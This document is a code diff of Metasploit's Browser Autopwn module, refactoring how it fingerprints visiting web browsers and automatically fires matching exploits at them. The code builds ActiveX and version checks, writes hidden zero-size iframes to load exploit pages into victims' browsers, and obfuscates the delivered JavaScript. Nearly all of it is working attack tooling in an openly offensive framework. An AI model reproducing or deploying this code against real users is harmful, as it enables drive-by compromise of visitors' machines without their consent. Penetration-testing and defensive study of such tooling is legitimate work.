@@ -27,9 +27,17 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'        => 'HTTP Client Automatic Exploiter',
 			'Version'     => '$Revision$',
 			'Description' => %q{
-					This module uses a combination of client-side and server-side
-				techniques to fingerprint HTTP clients and then automatically
-				exploit them.
+					This module has three actions.  The first (and the default)
+				is 'WebServer' which uses a combination of client-side and
+				server-side techniques to fingerprint HTTP clients and then
+				automatically exploit them.  Next is 'DefangedDetection' which
+				does only the fingerprinting part.  Lastly, 'list' simply
+				prints the names of all exploit modules that would be used by
+				the WebServer action given the current MATCH and EXCLUDE
+				options.
+				
+				Also adds a 'list' command which is the same as running with
+				ACTION=list.
 			},
 			'Author'      =>
 				[
@@ -121,19 +129,37 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
+	##
+	# CommandDispatcher stuff
+	##
+
+	def auxiliary_commands
+		{
+			'list' => "%red#{self.refname}%clr: List the exploits as filtered by MATCH and EXCLUDE"
+		}
+	end
+
+	def cmd_list(*args)
+		print_status("Listing Browser Autopwn exploits:")
+		print_line
+		each_autopwn_module do |name, mod|
+			@exploits[name] = nil
+			print_line name
+		end
+		print_line
+		print_status("Found #{@exploits.length} exploit modules")
+	end
+
+	##
+	# Actual exploit stuff
+	##
+
 	def run
 		if (action.name == 'list')
-			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
-			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
-			framework.exploits.each_module do |name, mod|
-				if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
-					@exploits[name] = nil
-					print_line name
-				end
-			end
-			print_line
-			print_status("Found #{@exploits.length} exploit modules")
+			cmd_list
 		elsif (action.name == 'DefangedDetection')
+			# Do everything we'd normally do for exploits, but don't start any
+			# actual exploit modules
 			exploit()
 		else
 			start_exploit_modules()
@@ -283,6 +309,14 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			@exploits[name] = mod.new
 		end
+		@exploits[name] = framework.modules.reload_module(@exploits[name])
+
+		# Reloading failed
+		unless @exploits[name]
+			@exploits.delete(name)
+			return 
+		end
+
 		apo = @exploits[name].class.autopwn_opts
 		if (apo[:rank] < @minrank)
 			@exploits.delete(name)
@@ -328,7 +362,9 @@ class Metasploit3 < Msf::Auxiliary
 		if (datastore['DEBUG'])
 			@exploits[name].datastore['URIPATH'] = name
 		else
-			@exploits[name].datastore['URIPATH'] = nil
+			# randomize it manually since if a saved value exists in the user's
+			# configuration, the saved value will get used if we set it to nil
+			@exploits[name].datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4)
 		end
 
 		@exploits[name].datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
@@ -382,68 +418,75 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Starting exploit modules on host #{@lhost}...")
 		print_status("---")
 		print_line
-		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
-		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
-		framework.exploits.each_module do |name, mod|
-			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
-				next if !(init_exploit(name))
-				apo = mod.autopwn_opts.dup
-				apo[:name] = name.dup
-				apo[:vuln_test] ||= ""
+		each_autopwn_module do |name, mod|
+			# Start the module.  If that fails for some reason, don't bother
+			# adding tests for it.
+			next if !(init_exploit(name))
 
-				if apo[:classid]
-					# Then this is an IE exploit that uses an ActiveX control,
-					# build the appropriate tests for it.
-					method = apo[:vuln_test].dup
-					apo[:vuln_test] = ""
-					apo[:ua_name] = HttpClients::IE
-					if apo[:classid].kind_of?(Array)  # then it's many classids
-						apo[:classid].each { |clsid|
-							apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
-							apo[:vuln_test] << " is_vuln = true;\n"
-							apo[:vuln_test] << "}\n"
-						}
-					else
-						apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
+			apo = mod.autopwn_opts.dup
+			apo[:name] = name.dup
+			apo[:vuln_test] ||= ""
+
+			if apo[:classid]
+				# Then this is an IE exploit that uses an ActiveX control,
+				# build the appropriate tests for it.
+				method = apo[:vuln_test].dup
+				apo[:vuln_test] = ""
+				apo[:ua_name] = HttpClients::IE
+				if apo[:classid].kind_of?(Array)  # then it's many classids
+					apo[:classid].each { |clsid|
+						apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
 						apo[:vuln_test] << " is_vuln = true;\n"
 						apo[:vuln_test] << "}\n"
-					end
-				end
-
-				if apo[:ua_minver] and apo[:ua_maxver]
-					ver_test =
-							"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
-							"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
-				elsif apo[:ua_minver]
-					ver_test = "!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}')\n"
-				elsif apo[:ua_maxver]
-					ver_test = "!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')\n"
+					}
 				else
-					ver_test = "true"
+					apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
+					apo[:vuln_test] << " is_vuln = true;\n"
+					apo[:vuln_test] << "}\n"
 				end
+			end
+
+			# If the exploit supplies a min/max version, build up a test to
+			# check for the proper version.  Note: The version comparison
+			# functions come from javascriptosdetect.
+			if apo[:ua_minver] and apo[:ua_maxver]
+				ver_test =
+						"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
+						"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
+			elsif apo[:ua_minver]
+				ver_test = "!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}')\n"
+			elsif apo[:ua_maxver]
+				ver_test = "!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')\n"
+			else
+				ver_test = nil
+			end
+
+			# if we built a version check above, add it to the normal test
+			if ver_test
 				test =  "if (#{ver_test}) { "
 				test << (apo[:vuln_test].empty? ? "is_vuln = true;" : apo[:vuln_test])
 				test << "} else { is_vuln = false; }\n"
 				apo[:vuln_test] = test
+			end
 
-				# Now that we've got all of our exploit tests put together,
-				# organize them into requires-scripting and
-				# doesnt-require-scripting, sorted by browser name.
-				if apo[:javascript] && apo[:ua_name]
-					@js_tests[apo[:ua_name]] ||= []
-					@js_tests[apo[:ua_name]].push(apo)
-				elsif apo[:javascript]
-					@js_tests["generic"] ||= []
-					@js_tests["generic"].push(apo)
-				elsif apo[:ua_name]
-					@noscript_tests[apo[:ua_name]] ||= []
-					@noscript_tests[apo[:ua_name]].push(apo)
-				else
-					@noscript_tests["generic"] ||= []
-					@noscript_tests["generic"].push(apo)
-				end
+			# Now that we've got all of our exploit tests put together,
+			# organize them into requires-scripting and
+			# doesnt-require-scripting, sorted by browser name.
+			if apo[:javascript] && apo[:ua_name]
+				@js_tests[apo[:ua_name]] ||= []
+				@js_tests[apo[:ua_name]].push(apo)
+			elsif apo[:javascript]
+				@js_tests["generic"] ||= []
+				@js_tests["generic"].push(apo)
+			elsif apo[:ua_name]
+				@noscript_tests[apo[:ua_name]] ||= []
+				@noscript_tests[apo[:ua_name]].push(apo)
+			else
+				@noscript_tests["generic"] ||= []
+				@noscript_tests["generic"].push(apo)
 			end
 		end
+
 		# start handlers for each type of payload
 		[@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport|
 			if (lport and @payloads[lport])
@@ -484,14 +527,20 @@ class Metasploit3 < Msf::Auxiliary
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
 
+		# This matters a lot less for noscript exploits since they basically
+		# get thrown into a big pile of iframes that the browser will load
+		# semi-concurrently.  Still, might as well.
 		@noscript_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
 
 	end
 
+	#
+	# Main dispatcher method for when we get a request
+	#
 	def on_request_uri(cli, request)
-		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
+		print_status("#{cli.peerhost.ljust 16} Browser Autopwn request '#{request.uri}'")
 
 		case request.uri
 		when self.get_resource
@@ -516,6 +565,8 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Responding with exploits")
 				response = build_script_response(cli, request)
 			end
+			response["Expires"] = "0"
+			response["Cache-Control"] = "must-revalidate"
 
 			cli.send_response(response)
 		when %r{^#{self.get_resource}.*ns=1}
@@ -544,6 +595,20 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
+	def html_for_exploit(autopwn_info, client_info)
+		html = ""
+
+		html << (autopwn_info[:prefix_html] || "") + "\n"
+		html << build_iframe(exploit_resource(autopwn_info[:name])) + "\n"
+		html << (autopwn_info[:postfix_html] || "") + "\n"
+
+		if (HttpClients::IE == autopwn_info[:ua_name])
+			html = "<!--[if IE]>\n#{html}\n<![endif]-->\n"
+		end
+
+		html
+	end
+
 	def build_noscript_html(cli, request)
 		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
 		body = ""
@@ -551,28 +616,10 @@ class Metasploit3 < Msf::Auxiliary
 		@noscript_tests.each { |browser, sploits|
 			next if sploits.length == 0
 
-			# If client_info is nil then get_client failed and we have no
-			# knowledge of this client, so we can't assume anything about their
-			# browser.  If the exploit does not specify a browser target, that
-			# means it it is generic and will work anywhere (or at least be
-			# able to autodetect).  If the currently connected client's ua_name
-			# is nil, then the fingerprinting didn't work for some reason.
-			# Lastly, check to see if the client's browser matches the browser
-			# targetted by this group of exploits. In all of these cases, we
-			# need to send all the exploits in the list.
-			if not(client_info && browser && [nil, browser].include?(client_info[:ua_name]))
-				if (HttpClients::IE == browser)
-					body << "<!--[if IE]>\n"
-				end
-				sploits.map do |s|
-			
-					body << (s[:prefix_html] || "") + "\n"
-					body << build_iframe(exploit_resource(s[:name])) + "\n"
-					body << (s[:postfix_html] || "") + "\n"
-				end
-				if (HttpClients::IE == browser)
-					body << "<![endif]-->\n"
-				end
+			next unless client_matches_browser(client_info, browser)
+
+			sploits.each do |s|
+				body << html_for_exploit( s, client_info )
 			end
 		}
 		body
@@ -593,6 +640,12 @@ class Metasploit3 < Msf::Auxiliary
 		return response
 	end
 
+	#
+	# Build some javascript that attempts to determine which exploits to run
+	# for the victim's OS and browser.
+	# 
+	# Returns a raw javascript string to be eval'd on the victim
+	#
 	def build_script_response(cli, request)
 		response = create_response()
 		response['Expires'] = '0'
@@ -664,14 +717,15 @@ class Metasploit3 < Msf::Auxiliary
 				written_iframes[written_iframes.length] = myframe;
 				str = '';
 				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
-				#{datastore['DEBUG'] ? "str += '<p>' + myframe + '</p>'" : ""};
 				document.body.innerHTML += (str);
 			}
-			var global_exploit_list = [];
 			function next_exploit(exploit_idx) {
+				#{js_debug("'next_exploit(' + exploit_idx +')'")}
 				if (!global_exploit_list[exploit_idx]) {
+					#{js_debug("'End'")}
 					return;
 				}
+				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + '<br>'")}
 				// Wrap all of the vuln tests in a try-catch block so a
 				// single borked test doesn't prevent other exploits
 				// from working.
@@ -682,14 +736,9 @@ class Metasploit3 < Msf::Auxiliary
 					} else {
 						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
 					}
-					
-					/*
-					alert("next_exploit(" + (exploit_idx).toString() + ") => " +
-						global_exploit_list[exploit_idx].resource + "\\n" +
-						test + " -- " + eval(test) );
-					*/
-					
+
 					if (eval(test)) {
+						#{js_debug("'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'")}
 						write_iframe(global_exploit_list[exploit_idx].resource);
 						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
 					} else {
@@ -697,9 +746,11 @@ class Metasploit3 < Msf::Auxiliary
 						next_exploit(exploit_idx+1);
 					}
 				} catch(e) {
+					#{js_debug("'test threw an exception, trying next one'")}
 					next_exploit(exploit_idx+1);
 				};
 			}
+			window.next_exploit = next_exploit;
 		ENDJS
 		opts = {
 			'Symbols' => {
@@ -720,51 +771,78 @@ class Metasploit3 < Msf::Auxiliary
 			'Strings' => true,
 		}
 
+		# Prepare all of the tests for next_exploit to loop through
+		js << "var global_exploit_list = []\n";
+		# if we have no client_info, this will add all tests. Otherwise tries
+		# to only send tests for exploits that target the client's detected
+		# browser.
 		@js_tests.each { |browser, sploits|
-			next if sploits.length == 0
-			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
-				# Make sure the browser names can be used as an identifier in
-				# case something wacky happens to them.
-				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
-				js << "function #{func_name}() { \n"
-				sploits.map do |s|
-										
-					# get rid of newlines and escape quotes
-					test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
+			next unless client_matches_browser(client_info, browser)
+
+			if (client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
+				sploits.each do |s|
+					if s[:vuln_test].nil? or s[:vuln_test].empty?
+						test = "is_vuln = true"
+					else
+						# get rid of newlines and escape quotes
+						test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
+					end
 					# shouldn't be any in the resource, but just in case...
 					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
 
 					# Skip exploits that don't match the client's OS.
 					if (host_info and host_info[:os_name] and s[:os_name])
-						next unless s[:os_name].include?(host_info[:os_name])
+						# Host os normalization will set os_name to "Unknown"
+						# if it has no fingerprinting info.  
+						#
+						# See lib/msf/core/model/host.rb
+						if host_info[:os_name] != "Unknown"
+							next unless s[:os_name].include?(host_info[:os_name])
+						end
 					end
-					js << " global_exploit_list[global_exploit_list.length] = {\n"
-					if test and not test.empty?
-						js << "  'test':'#{test}',\n"
-					else
-						js << "  'test':'is_vuln = true;',\n"
-					end
+					js << "global_exploit_list[global_exploit_list.length] = {\n"
+					js << "  'test':'#{test}',\n"
 					js << "  'resource':'#{res}'\n"
-					js << " };\n"
+					js << "};\n"
 				end
-				js << "};\n" # end function exploit...()
-				js << "#{js_debug("'exploit func: #{func_name}()<br>'")}\n"
-				js << "#{func_name}();\n" # run that bad boy
-				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
-		js << %q|var noscript_exploits = "|
-		js << Rex::Text.to_hex(build_noscript_html(cli, request), "%")
-		js << %q|";|
-		js << %q|noscript_div = document.createElement("div");|
-		js << %q|noscript_div.innerHTML = unescape(noscript_exploits);|
-		js << %q|document.body.appendChild(noscript_div);|
 
-		#js << %q|document.write("<div>" + noscript_exploits);|
-		opts['Symbols']['Methods'].push("noscript_exploits")
-		opts['Symbols']['Methods'].push("noscript_div")
+		# Add a javaEnabled() test specifically for java exploits.  Other
+		# exploits that don't require javascript go into a big pile of iframes
+		# that will be dumped out after other exploitation is done, assuming
+		# the browser didn't stop somewhere along the way due to a successful
+		# exploit or a crash from all the memory raping we just did.
+		noscript_html = ""
+		@noscript_tests.each { |browser, sploits|
+			sploits.each do |s|
+				if s[:name] =~ %r|/java_|
+					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+					js << "global_exploit_list[global_exploit_list.length] = {\n"
+					js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
+					js << "  'resource':'#{res}'\n"
+					js << "};\n"
+				else
+					# Some other kind of exploit that we can't generically
+					# check for in javascript, throw it on the pile.
+					noscript_html << html_for_exploit(s, client_info)
+				end
+			end
+		}
 		js << "#{js_debug("'starting exploits<br>'")}\n"
 		js << "next_exploit(0);\n"
+
+		# If all of our exploits that require javascript fail, try to continue
+		# with those that don't
+		js << %Q|var noscript_exploits = "|
+		js << Rex::Text.to_hex(noscript_html, "%")
+		js << %Q|";\n|
+		js << %Q|noscript_div = document.createElement("div");\n|
+		js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
+		js << %Q|document.body.appendChild(noscript_div);\n|
+
+		opts['Symbols']['Methods'].push("noscript_exploits")
+		opts['Symbols']['Methods'].push("noscript_div")
 
 		if not datastore['DEBUG']
 			js.obfuscate
@@ -773,6 +851,48 @@ class Metasploit3 < Msf::Auxiliary
 
 		return response
 	end
+
+	# 
+	# Yields each module that exports autopwn_info, filtering on MATCH and EXCLUDE options
+	#
+	def each_autopwn_module(&block)
+		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
+		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
+		framework.exploits.each_module do |name, mod|
+			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
+				yield name, mod
+			end
+		end
+	end
+
+	#
+	# Returns true if an exploit for +browser+ (one of the +OperatingSystems+
+	# constants) should be sent for a particilar client.  +client_info+ should
+	# be something returned by +get_client+.
+	#
+	# If +client_info+ is nil then get_client failed and we have no
+	# knowledge of this client, so we can't assume anything about their
+	# browser.  If the exploit does not specify a browser target, that
+	# means it it is generic and will work anywhere (or at least be
+	# able to autodetect).  If the currently connected client's ua_name
+	# is nil, then the fingerprinting didn't work for some reason.
+	# Lastly, check to see if the client's browser matches the browser
+	# targetted by this group of exploits. In all of these cases, we
+	# need to send all the exploits in the list.
+	#
+	# In contrast, if we have all of that info and it doesn't match, we
+	# don't need to bother sending it.
+	#
+	def client_matches_browser(client_info, browser)
+		if client_info and browser and client_info[:ua_name] 
+			if browser != "generic" and  client_info[:ua_name] != browser
+				return false
+			end
+		end
+
+		true
+	end
+
 
 	# consider abstracting this out to a method (probably
 	# with a different name) of Msf::Auxiliary::Report or
@@ -895,6 +1015,8 @@ class Metasploit3 < Msf::Auxiliary
 	def cleanup
 		print_status("Cleaning up exploits...")
 		@exploits.each_pair do |name, mod|
+			# if the module died for some reason, we can't kill it
+			next unless mod
 			framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s]
 		end
 		@handler_job_ids.each do |id|
